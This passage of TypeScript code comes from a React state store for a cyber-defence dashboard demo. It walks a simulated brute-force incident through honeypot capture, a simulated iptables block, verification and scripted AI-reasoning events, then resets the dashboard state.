        this.appendHoneypotCommand(cmd);
        this.appendEvent({
          type: "honeypot_command",
          severity: "info",
          command: cmd,
          sessionId,
          timestamp: stamp(),
          message: "Attacker command captured",
        });
      }, (i + 1) * 900);
      this.demoSubTimers.push(t);
    });

    await wait(3200);
    if (cancelled()) return;

    // ── STEP 6 — Honeypot Redirection (campaign continuity) ─────────────
    this.setSimulation({ phase: "containment" });
    this.setTopology({ attackActive: false, attackTarget: null });
    this.setOverview({
      activeThreats: 0,
      threatsContained: this.state.overview.threatsContained + 1,
    });
    this.setHoneypotStatus("waiting");
    // Firewall blocking is SIMULATED here — no OS firewall command is run.
    // The badge stays in SIMULATION MODE until a real command executes.
    this.recordFirewallCommand({
      action: "block",
      target: attackerIp,
      command: `simulated iptables -A INPUT -s ${attackerIp} -j DROP`,
      success: true,
      mode: "simulation",
    });
    this.appendEvent({
      type: "containment_in_progress",
      severity: "warning",
      source: "orchestrator",
      timestamp: stamp(),
      message: "Containment started — firewall rule staged for attacker source",
    });
    this.appendEvent({
      type: "firewall_executed",
      severity: "warning",
      source: "executor (simulation)",
      target: attackerIp,
      timestamp: stamp(),
      message: `SIMULATION MODE — firewall block applied to ${attackerIp} (no live command was executed)`,
    });

    await wait(1200);
    if (cancelled()) return;

    // ── STEP 8 — Verification / STEP 9 — Threat Contained ──────────────
    this.appendEvent({
      type: "verification_completed",
      severity: "success",
      source: "orchestrator",
      timestamp: stamp(),
      message: `INCIDENT #${incidentId} — verification: THREAT CONTAINED ✓`,
    });
    this.recordFirewallCommand({
      action: "verify",
      target: attackerIp,
      command: "simulated containment verification — no further traffic from source",
      success: true,
      mode: "simulation",
    });
    if (!this.aiEventsSeen) {
      this.updateAI({ phase: "verifying" });
      this.appendEvent({
        type: "defense_action_completed", severity: "success", source: attackerIp,
        timestamp: stamp(), message: "honeypot captive — attacker isolated in deception environment",
      });
      await wait(1000);
      if (cancelled()) return;
      this.updateAI({
        phase: "contained",
        verification: "CONTAINED",
      });
      this.appendAiReasoning({
        type: "ai_reasoning",
        timestamp: stamp(),
        threatId: incidentId,
        classification: "Brute Force",
        confidence: 0.97,
        risk: "HIGH",
        riskScore: 78,
        recommendation: "Threat contained",
        target: attackerIp,
        reasoning: "No further malicious activity from the attacker after honeypot capture and firewall block — incident closed.",
        source: "simulation",
        mode: "demo",
        stage: "verification",
        action: "BLOCK",
      });
      this.appendEvent({
        type: "ai_verification_completed", severity: "success", source: attackerIp,
        timestamp: stamp(),
        message: `AI verification: CONTAINED — no further malicious activity from ${attackerIp} after isolation.`,
      });
      this.appendEvent({
        type: "threat_contained", severity: "success", source: attackerIp,
        timestamp: stamp(), message: `INCIDENT #${incidentId} — Threat contained, AI verified response was effective`,
      });
    }

    await wait(1400);
    if (cancelled()) return;

    // Phase 6 — Complete / final secured state.
    this.setSimulation({ phase: "completed", running: false, stopped: false });
    this.appendEvent({
      type: "simulation_completed",
      severity: "success",
      timestamp: stamp(),
      message: "Demo complete — attack blocked and environment secured",
    });
  }

  // Invalidates any in-flight demo lifecycle and clears its sub-timers.
  private cancelDemoLifecycle() {
    this.demoRunId++;
    this.demoSubTimers.forEach((t) => clearTimeout(t));
    this.demoSubTimers = [];
  }

  // Stops demo-mode activity and returns the dashboard to the calm neutral
  // state — no attack colors, no glow, honeypot back on standby.
  private stopDemoSimulation() {
    this.cancelDemoLifecycle();
    this.resetSimulation();
  }

  openSettings(tab: AppState["settings"]["tab"] = "protected_target") {
    this.setState({ settings: { open: true, tab } });
  }

  closeSettings() {
    this.setState({ settings: { ...this.state.settings, open: false } });
  }

  setSettingsTab(tab: AppState["settings"]["tab"]) {
    this.setState({ settings: { ...this.state.settings, tab } });
  }

  resetSimulation() {
    this.setState({
      topology: { attackActive: false, attackTarget: null },
      honeypot: { status: "waiting", commands: [], fingerprint: null },
      simulation: { phase: "ready", running: false, stopped: false },
      approval: { pending: null },
      aiReasoning: [],
      firewall: { status: "idle", commands: [] },
      ai: createInitialAIState(),
      overview: {
        activeThreats: 0,
        threatsDetected: 0,
        threatsContained: 0,
        honeypotCaptures: 0,
        networkTraffic: 0,
        systemHealth: "Healthy",
      },
    });
  }
}

export const store = new Store();

// ── React binding ───────────────────────────────────────────────────────────

export function useAppState(): AppState {
  return useSyncExternalStore(
    (cb) => store.subscribe(cb),
    () => store.getState()
  );
}